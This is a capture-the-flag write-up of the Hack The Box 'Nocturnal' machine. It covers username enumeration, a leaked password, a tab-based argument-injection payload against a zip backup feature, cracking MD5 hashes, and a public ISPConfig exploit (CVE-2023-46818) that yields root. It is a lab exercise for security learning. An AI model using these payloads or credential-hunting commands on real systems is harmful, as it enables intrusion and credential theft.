---
icon: jug-detergent
---

# HTB-NOCTURNAL

<figure><img src="../../../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

#### Attack Flow Explanation

**Initial Access Phase**

1. **Access to Upload Service**
   * The assessment began with discovering the upload service on the web application.
   * By enumerating users through the `/view.php` functionality, valid usernames were identified (`admin`, `tobias`, and `amanda`).
2. **Discovery of Sensitive File**
   * Checking available files revealed that only _amanda_ had uploaded a document (`privacy.odt`).
   * This document contained a temporary password provided by the IT team.
3. **Authenticated Access**
   * Although the password did not work over SSH, it successfully granted access to the web application as _amanda_.
   * Membership in the `admin` group allowed entry to the **Admin Dashboard**.
4. **Exploitation of Backup Functionality**
   * Reviewing the source code in the dashboard uncovered a backup feature in `admin.php`.
   * The feature validated input only against blacklisted characters, enabling parameter injection into the `zip` command.
   * By manipulating the `password` parameter with a tab character, arbitrary files such as the **SQLite database** were exfiltrated.
5. **Database Analysis & Credential Extraction**
   * The database contained user hashes (`admin`, `amanda`, `tobias`, `sn0x`).
   * Cracking the hash for _tobias_ yielded the plaintext password `slowmotionapocalypse`.
   * This credential worked over **SSH**, providing a shell as _tobias_.
6. **Alternative Path – Command Injection**
   * The same vulnerable backup feature also permitted direct command injection.
   * This gave a **www-data shell**, which could also be leveraged to exfiltrate the database, reinforcing the previous step.

***

**Privilege Escalation Phase**

1. **Credential Reuse for ISPConfig**
   * Exploring the filesystem indicated that ISPConfig was installed and running on port `8080`.
   * Using SSH port forwarding exposed the service locally.
   * The _tobias_ password was also valid for the ISPConfig `admin` account, granting dashboard access.
2. **Exploiting ISPConfig Vulnerability**
   * The ISPConfig version was identified as `3.2.10p1`.
   * Research revealed it was vulnerable to **CVE-2023-46818**, with a working public PoC.
   * Running the exploit with the admin credentials provided a **pseudo-shell as root**, achieving full system compromise.

&#x20;Final Outcome: The attack chain demonstrated a complete compromise starting from **user enumeration in the upload service** → **file disclosure & database extraction** → **SSH shell as Tobias** → **ISPConfig exploit** → **root access**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
┌──(sn0x㉿sn0x)-[~/HTB/Nocturnal]
└─$ rustscan -a 10.10.11.64 \  
--ulimit 10000 \ 
--range 1-65535 \
--timeout 2000 \
-- -Pn -sC -sV -A -O --reason --open --max-retries 2 --min-rate 1000 -vv
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.64:22
Open 10.10.11.64:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 11:00 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:00
Completed NSE at 11:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:00
Completed NSE at 11:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:00
Completed NSE at 11:00, 0.00s elapsed
Initiating SYN Stealth Scan at 11:00
Scanning nocturnal.htb (10.10.11.64) [2 ports]
Discovered open port 22/tcp on 10.10.11.64
Discovered open port 80/tcp on 10.10.11.64
Completed SYN Stealth Scan at 11:00, 0.29s elapsed (2 total ports)
Initiating Service scan at 11:00
Scanning 2 services on nocturnal.htb (10.10.11.64)
Completed Service scan at 11:00, 6.54s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against nocturnal.htb (10.10.11.64)
Initiating Traceroute at 11:01
Completed Traceroute at 11:01, 0.26s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:01
Completed Parallel DNS resolution of 1 host. at 11:01, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.11.64.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:01
Completed NSE at 11:01, 7.41s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:01
Completed NSE at 11:01, 1.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:01
Completed NSE at 11:01, 0.00s elapsed
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up, received user-set (0.26s latency).
Scanned at 2025-08-18 11:00:52 UTC for 18s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/18%OT=22%CT=%CU=43080%PV=Y%DS=2%DC=T%G=N%TM=68A307F6
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 47.505 days (since Tue Jul  1 22:54:33 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   256.74 ms 10.10.14.1
2   256.23 ms nocturnal.htb (10.10.11.64)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:01
Completed NSE at 11:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:01
Completed NSE at 11:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:01
Completed NSE at 11:01, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
           Raw packets sent: 34 (2.306KB) | Rcvd: 19 (1.506KB)

```

During the scan, Nmap identified that the service running on port 80 was redirecting requests to the domain `nocturnal.htb`. To properly resolve this hostname within my testing environment, I added an entry for `nocturnal.htb` in the `/etc/hosts` file, mapping it to the target machine’s IP address.

### Initial Access <a href="#initial-access" id="initial-access"></a>

For the initial access phase, navigating to `http://nocturnal.htb` revealed a welcome page introducing the functionality of an upload service, suggesting that the application may allow users to upload files for further interaction

<figure><img src="../../../../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

The application provided the option to register a new account, after which I was able to log in successfully. Upon accessing the authenticated area, I encountered a file upload form. My initial attempt to upload a PHP file—given that the backend appeared to be running on PHP—was blocked and returned an error. Further inspection revealed that the upload functionality was restricted to specific file types, namely `pdf`, `doc`, `docx`, `xls`, `xlsx`, and `odt`.

<figure><img src="../../../../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

* Upload with valid extension succeeds.
* Link appears under **Your Files** section.
* Link points to `/view.php` with parameters:
  * `username`
  * `file`
* Requesting a non-existent file → shows error.
* Error response also discloses **all files tied to that username** → **Information Disclosure vulnerability**.

<figure><img src="../../../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

Among the advertised features of the application was a collaboration functionality, which implied that files could potentially be shared or accessed across different users. This raised the possibility of enumerating other users’ files by guessing their usernames and leveraging the `/view.php` endpoint. To test this, I used `ffuf` for brute-forcing valid usernames, which successfully identified three existing accounts: `admin`, `tobias`, and `amanda`.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Nocturnal]
└─$ ffuf -H 'Cookie: PHPSESSID=oaq1ism6btk80da26l566bpg6m' \
       -u 'http://nocturnal.htb/view.php?username=FUZZ&file=doesnotexist.pdf' \
       -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
       -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=doesnotexist.pdf
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=oaq1ism6btk80da26l566bpg6m
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 33ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 40ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 38ms]
```

Out of the three identified users, only the account `amanda` had an uploaded file named `privacy.odt`. Since `.odt` files often contain text content, it was likely to include sensitive information. Upon downloading and opening the file, I found a message from the IT team addressed to Amanda, welcoming her and providing a temporary password: `arHkG7HAI68X8s1J`.

```python
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
Yours sincerely,
Nocturnal's IT team
```

The recovered password did not grant SSH access, but it successfully authenticated me into the web application as the user `amanda`. Once logged in, I discovered that Amanda was a member of the `admin` group, which granted her elevated privileges, including access to the application’s admin panel.

<figure><img src="../../../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

Within the admin panel, two key features were available: the ability to view the source code of all PHP files and to create a password-protected backup of the application. Reviewing the code behind the backup functionality (`admin.php`) revealed that it expected two POST parameters: `backup` and `password`. The provided password was only checked against a blacklist of certain characters to prevent injection, but afterward, it was passed directly into a Bash command. This behavior introduced the potential for command injection

Lets check this two files :

<figure><img src="../../../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

`admin.php`

```
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            color: #ff8c00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #2c2c2c;
            width: 90%;
            max-width: 1000px;
            padding: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
            border-radius: 12px;
        }

        h1, h2 {
            color: #ff8c00;
            font-weight: 600;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }

        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #555;
            border-radius: 8px;
            width: 100%;
            background-color: #333;
            color: #ff8c00;
        }

        button {
            padding: 12px;
            font-size: 16px;
            background-color: #2d72bc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #245a9e;
        }

        .file-list {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            background-color: #444;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }

        .file-list li.folder {
            background-color: #3b3b3b;
        }

        .file-list li.file {
            background-color: #4d4d4d;
        }

        .file-list li a {
            color: #ff8c00;
            text-decoration: none;
            margin-left: 10px;
        }

        .file-list li a:hover {
            text-decoration: underline;
        }

        pre {
            background-color: #2d2d2d;
            color: #eee;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            background-color: #e7f5e6;
            color: #2d7b40;
            font-weight: 500;
        }

        .error {
            background-color: #f8d7da;
            color: #842029;
        }

        .backup-output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: #ff8c00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Admin Panel</h1>

        <h2>File Structure (PHP Files Only)</h2>
        <?php listPhpFiles(__DIR__); ?>

        <h2>View File Content</h2>
        <?php if (isset($content)) { ?>
            <pre><?php echo $content; ?></pre>
        <?php } ?>

        <h2>Create Backup</h2>
        <form method="POST">
            <label for="password">Enter Password to Protect Backup:</label>
            <input type="password" name="password" required placeholder="Enter backup password">
            <button type="submit" name="backup">Create Backup</button>
        </form>

        <div class="backup-output">

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```

Inspection of the `login.php` source code disclosed the file path of the SQLite3 database used by the application. Interestingly, in an earlier version of the application, this database was stored in the same directory as the web scripts, making it directly accessible through the backup functionality. This would have allowed an attacker to download and inspect the database, potentially exposing user credentials and other sensitive information.

`login.php`

```
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
 
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
 
    $stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute()->fetchArray();
 
    if ($result && md5($password) === $result['password']) {
        $_SESSION['user_id'] = $result['id'];
        $_SESSION['username'] = $username;
        header('Location: dashboard.php');
        exit();
    } else {
        $error = 'Invalid username or password.';
    }
}
?>
// --- SNIP ---


```

<figure><img src="../../../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

Although the supplied password underwent filtering for several restricted characters, it was still possible to bypass the validation and inject parameters into the underlying ZIP command. Instead of using a space as a separator, a tab character could be used to append additional arguments. By exploiting this, I was able to include arbitrary files into the generated backup—for instance, the SQLite database. Setting the `password` parameter to `test\t./backups/sn0xyp0xy.zip\t../nocturnal_database/nocturnal_database.db #` forced the application to create a new ZIP file containing only the database, secured with the password `test`, while the trailing `#` commented out the remainder of the original command.

```javascript
POST /admin.php?view=admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php?view=admin.php
Cookie: PHPSESSID=rr65d0nv4du1s7c20oi6i8s9k5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
password=test	./backups/sn0xpoxy.zip	../nocturnal_database/nocturnal_database.db	%23&backup=

```

After downloading the crafted backup from `/backups/sn0xpoxy.zip` and extracting it with the password `test`, I gained access to the SQLite database file. Using the `sqlite3` client to inspect its contents revealed two tables: `uploads` and `users`. The `users` table contained the usernames along with their corresponding password hashes:

```python
┌──(sn0x㉿sn0x)-[~/HTB/Nocturnal]
└─$ sqlite3 nocturnal_database.db
SQLite version 3.46.1 2024-08-13 05:26:06
Enter ".help" for usage hints.
sqlite> .tables
uploads  users  
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|sn0x|cd1b8ecf103743a98958211a11e33b71
```

I then used **John the Ripper** to attempt cracking the hashes, and the password for `tobias` was quickly recovered as `slowmotionapocalypse`. This time, the credentials successfully worked over SSH, granting shell access to the target system and allowing me to capture the first flag.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Nocturnal]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
slowmotionapocalypse (?)
--- SNIP ---
```

<figure><img src="../../../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

While enumerating the file system under `/var/www`, I discovered references to _ISPConfig_, a popular open-source hosting control panel. This indicated that the target was running ISPConfig as part of its setup. Additionally, I identified that a separate PHP server instance was active on port `8080`, suggesting another potential attack surface to investigate.

```
tobias@nocturnal:~$  ls -la /var/www/
total 24                                                                                                                     
drwxr-xr-x  6 ispconfig ispconfig 4096 Apr 14 09:26 .                                                                        
drwxr-xr-x 14 root      root      4096 Oct 18  2024 ..                                                                       
drwxr-xr-x  2 root      root      4096 Mar  4 15:02 html                                                                     
lrwxrwxrwx  1 root      root        34 Oct 17  2024 ispconfig -> /usr/local/ispconfig/interface/web                          
drwxr-xr-x  2 www-data  www-data  4096 Aug 18 10:14 nocturnal_database                                                       
drwxr-xr-x  4 www-data  www-data  4096 Apr 17 09:02 nocturnal.htb                                                                          
drwxr-xr-x  4 ispconfig ispconfig 4096 Oct 17  2024 php-fcgi-scripts  
 
$ ps auxwwww
--- SNIP ---
root         831  0.0  0.6 211568 27052 ?        Ss   10:07   0:00 /usr/bin/php -S 127.0.0.1:8080
--- SNIP ---
```

<figure><img src="../../../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

By setting up SSH port forwarding to expose port `8080` locally and accessing it through a browser, I was presented with the login interface for ISPConfig. Testing the previously cracked credentials revealed that the password for `tobias` was also valid for the `admin` account. This granted me full access to the ISPConfig dashboard.

<figure><img src="../../../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

Exploring the _Help_ section within ISPConfig revealed that the instance was running version `3.2.10p1`. A quick online search confirmed that this version was affected by a known vulnerability, **CVE-2023-46818**, with publicly available proof-of-concept exploits. Executing the provided Python exploit against the target—supplying the ISPConfig URL and the previously obtained admin credentials—successfully granted me a pseudo-shell with `root` privileges

```
python3 exploit.py http://127.0.0.1:8000 admin slowmotionapocalypse
[+] Target URL: http://127.0.0.1:8000/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell
 
ispconfig-shell# whoami
root
```

### Second Method to Root&#x20;

#### 1) Confirm Current Access

Run basic recon commands to see who you are and what system you’re on:

```bash
whoami
id
hostname
uname -a
pwd
```

#### 2) Enumerate Local Services & Processes

Check what services are running locally:

```bash
ps aux --no-heading | head -n 30
ss -tulpn
# or
netstat -tulpn 2>/dev/null
```

Focus especially on services listening only on **127.0.0.1**, like ports `8080`, etc.

#### 3) Access Local Service via SSH Port Forwarding

If a service is bound to localhost only, forward it through SSH:

```bash
ssh -L 8080:127.0.0.1:8080 tobias@TARGET
```

Then visit in browser:

```
http://127.0.0.1:8080
```

#### 4) Try Logging into Admin Panel

Use possible credential reuse:

* Username: `admin`
* Password: `slowmotionapocalypse`

If successful, move to panel enumeration.

#### 5) Enumerate the Admin Panel

Use **Browser DevTools** or **Burp Suite**:

* Look at POST/GET requests, parameters, and responses.
* Pay special attention to features like translation editors, backup uploads, or custom fields where input may get stored and served back.

#### 6) Stored Content → Potential File Write

If the panel allows saving/modifying files:

* Check if input is written into `/var/www/...` or similar.
* If files become web-accessible, this may lead to code execution.

_(No payloads here, just the high-level concept.)_

#### 7) Once You Have Web-Shell (www-data)

Do internal recon:

```bash
id
uname -a
pwd
ls -la /var/www
ls -la /home
ps aux | egrep 'ispconfig|apache|nginx|php'
```

Search for configs/credentials:

```bash
grep -iR "password" /var/www /etc 2>/dev/null
find / -maxdepth 3 -type f \( -name "*.conf" -o -name "*.php" -o -name "*.ini" \) 2>/dev/null
```

#### 8) Scheduled Tasks & SUID Files

Check for privilege escalation opportunities:

```bash
crontab -l
ls -la /etc/cron.* /etc/crontab
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null
```

Look for root-owned scripts or writable cron tasks.

#### 9) Database / Config Credentials

For ISPConfig setups, configs often contain DB credentials. If found, dump DB → extract hashes → crack them (for lab use).

#### 10) Sudo or Password Reuse

Try:

```bash
sudo -l
```

If another user’s password or root password is found → use `su - root` or `ssh root@localhost`.

#### 11) If Root Credentials Found

Escalate:

```bash
su - root
# or
ssh root@TARGET
```

Then:

```bash
cat /root/root.txt
```

#### 12) Web-Based RCE → Root Path

Typical flow:

1. Admin panel → find stored content path.
2. Make it web-accessible to run small commands.
3. Enumerate configs, DB creds, backup/cron jobs.
4. Use credentials or privileged scripts to escalate to root.

<figure><img src="../../../../.gitbook/assets/complete (1).gif" alt=""><figcaption></figcaption></figure>
